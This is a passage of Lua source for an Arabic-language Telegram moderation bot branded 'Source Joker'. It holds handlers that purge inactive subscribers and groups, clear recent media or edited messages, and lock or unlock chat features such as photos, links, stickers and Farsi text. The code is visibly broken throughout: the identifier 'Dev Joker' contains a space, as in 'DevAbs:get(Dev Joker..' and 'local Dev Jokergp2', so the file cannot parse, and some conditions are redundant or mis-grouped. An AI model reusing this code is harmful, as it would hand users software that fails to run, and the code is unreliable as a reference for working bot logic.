for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
DevAbs:srem(Dev Joker.."bot:userss",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لا يوجد مشتركين وهميين* \n ', 1, 'md')
else
local ok = #pv - sendok
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين الان ↫ { '..#pv..' }\n⌁︙تم حذف ↫ { '..sendok..' } من المشتركين\n⌁︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source Joker     --
if text == "تنظيف المجموعات" and is_sudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and is_sudo(msg) and ChCheck(msg) then 
local group = DevAbs:smembers(Dev Joker.."bot:groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m THE BOT IS NOT ADMIN ↓\n'..group[i]..'\n\27[1;37m')
DevAbs:srem(Dev Joker.."bot:groups",group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAbs:srem( Dev Joker.."bot:groups",group[i]) 
q = q + 1
print('\27[30;35m THE BOT IS LEFT GROUP ↓\n'..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAbs:srem( Dev Joker.."bot:groups",group[i]) 
q = q + 1
print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n'..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
DevAbs:srem( Dev Joker.."bot:groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙*لاتوجد مجموعات وهميه* \n ', 1, 'md')   
else
local Dev Jokergp2 = (w + q)
local Dev Jokergp3 = #group - Dev Jokergp2
if q == 0 then
Dev Jokergp2 = ''
else
Dev Jokergp2 = '\n⌁︙تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
Dev Jokergp1 = ''
else
Dev Jokergp1 = '\n⌁︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙عدد المجموعات الان ↫ { '..#group..' }'..Dev Jokergp1..''..Dev Jokergp2..'\n⌁︙العدد الحقيقي الان  ↫ ( '..Dev Jokergp3..' ) \n ', 1, 'md')
end
end
end,nil)
end
return false
end 
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "تنظيف ميديا" or text == "تنظيف الميديا" and ChCheck(msg) then   
Abs_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Abs_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Abs_Del},function(arg,data)
new = 0
Abs_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
Abs_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
delete_msg(msg.chat_id_,Abs_Del2)
end,nil)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تنظيف 100 من الميديا", 1, 'md')
end
--     Source Joker     --
if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
Abs_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Abs_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Abs_Del},function(arg,data)
new = 0
Abs_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Abs_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
delete_msg(msg.chat_id_,Abs_Del2)
end,nil)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
end
--     Source Joker     --
if text and text:match("^تنظيف الرسائل$") and is_sudo(msg) and ChCheck(msg) then
local allmgs = DevAbs:get(Dev Joker.."bot:allmsgs")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف '..allmgs..' من رسائل المجموعات', 'md')
DevAbs:del(Dev Joker.."bot:allmsgs")
end
--     Source Joker     --
if ChatType == 'sp' or ChatType == 'gp'  then
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpts[2] == "التعديل" then
if DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التعديل بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'editmsg'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unlockpts[2] == "التعديل الميديا" or unlockpts[2] == "تعديل الميديا" then
if DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح تعديل الميديا\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'editmsg'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مفتوح في المجموعة', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه" then
if DevAbs:get(Dev Joker..'farsi'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفارسية بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'farsi'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفارسية بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unlockpts[2] == "الفشار" then
if not DevAbs:get(Dev Joker..'fshar'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفشار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'fshar'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مفتوح في المجموعة', 1, 'md')
end
end
if unlockpts[2] == "الطائفيه" then
if not DevAbs:get(Dev Joker..'taf'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الطائفيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'taf'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unlockpts[2] == "الكفر" then
if not DevAbs:get(Dev Joker..'kaf'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الكفر بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'kaf'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مفتوح في المجموعة', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه بالطرد" then
if DevAbs:get(Dev Joker..'farsiban'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفارسية بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'farsiban'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفارسية بالطرد بالفعل مفتوحة', 1, 'md')
end
end
if unlockpts[2] == "البوتات" then
if DevAbs:get(Dev Joker..'bot:bots:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح البوتات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:bots:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙البوتات بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unlockpts[2] == "البوتات بالطرد" then
if DevAbs:get(Dev Joker..'bot:bots:ban'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح البوتات بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:bots:ban'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙البوتات بالطرد بالفعل مفتوحة', 1, 'md')
end
end
if unlockpts[2] == "البوتات بالتقييد" then
if DevAbs:get(Dev Joker..'keed_bots'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح البوتات بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'keed_bots'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙البوتات بالتقييد بالفعل مفتوحة ', 1, 'md')
end
end
if unlockpts[2] == "التكرار" then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التكرار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'anti-flood:'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التكرار بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if unlockpts[2] == "التثبيت" then
if DevAbs:get(Dev Joker..'bot:pin:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التثبيت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:pin:mute'..msg.chat_id_)
DevAbs:srem(Dev Joker.."bot:pin:mutepin",msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مفتوحة في المجموعة', 1, 'md')
end end end
end
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutepts[2] == "الدردشه" then
if not DevAbs:get(Dev Joker..'bot:text:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الدردشة بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:text:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الدردشة بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الاونلاين" then
if not DevAbs:get(Dev Joker..'bot:inline:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الاونلاين بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:inline:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الصور" then
if not DevAbs:get(Dev Joker..'bot:photo:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الصور بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:photo:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الكلايش" then
if not DevAbs:get(Dev Joker..'bot:spam:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الكلايش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:spam:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الفيديو" then
if not DevAbs:get(Dev Joker..'bot:video:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفيديو بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:video:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "المتحركه" then
if not DevAbs:get(Dev Joker..'bot:gifs:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل المتحركة بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:gifs:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المتحركة بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الاغاني" then
if not DevAbs:get(Dev Joker..'bot:music:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الاغاني بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:music:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الصوت" then
if not DevAbs:get(Dev Joker..'bot:voice:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الصوت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:voice:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الروابط" then
if not DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الروابط بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:links:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "المواقع" then
if not DevAbs:get(Dev Joker..'bot:location:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل المواقع بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:location:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "المعرف" then
if not DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل المعرف بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'tags:lock'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المعرف بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الملفات" then
if not DevAbs:get(Dev Joker..'bot:document:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الملفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:document:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الهاشتاك" then
if not DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الهاشتاك بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:abstag:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الجهات" then
if not DevAbs:get(Dev Joker..'bot:contact:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الجهات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:contact:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '️⌁︙الجهات بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الشبكات" then
if not DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الشبكات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:webpage:mute'..msg.chat_id_,true) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "العربيه" then
if not DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل العربية بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:arabic:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العربية بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الانكليزيه" then
if not DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الانكليزيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:english:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الملصقات" then
if not DevAbs:get(Dev Joker..'bot:sticker:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الملصقات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:sticker:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الماركداون" then
if not DevAbs:get(Dev Joker..'markdown:lock'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الماركداون بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'markdown:lock'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "الاشعارات" then
if not DevAbs:get(Dev Joker..'bot:tgservice:jk'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الاشعارات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:tgservice:jk'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if mutepts[2] == "التوجيه" then
if not DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التوجيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:forward:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مقفلة في المجموعة', 1, 'md')
end
end
end
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutepts[2] == "الدردشه" then
if DevAbs:get(Dev Joker..'bot:text:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الدردشة بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:text:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الدردشة بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الصور" then
if DevAbs:get(Dev Joker..'bot:photo:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الصور بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:photo:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الكلايش" then
if DevAbs:get(Dev Joker..'bot:spam:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الكلايش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:spam:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الفيديو" then
if DevAbs:get(Dev Joker..'bot:video:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الفيديو بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:video:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الملفات" then
if DevAbs:get(Dev Joker..'bot:document:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الملفات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:document:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الاونلاين" then
if DevAbs:get(Dev Joker..'bot:inline:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الاونلاين بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:inline:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الماركداون" then
if DevAbs:get(Dev Joker..'markdown:lock'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الماركداون بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'markdown:lock'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "المتحركه" then
if DevAbs:get(Dev Joker..'bot:gifs:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح المتحركة بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:gifs:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المتحركة بالفعل مفتوحة في المجموعة', 1, 'md')
end
end
if unmutepts[2] == "الاغاني" then
if DevAbs:get(Dev Joker..'bot:music:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الاغاني بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:music:mute'..msg.chat_id_)
else
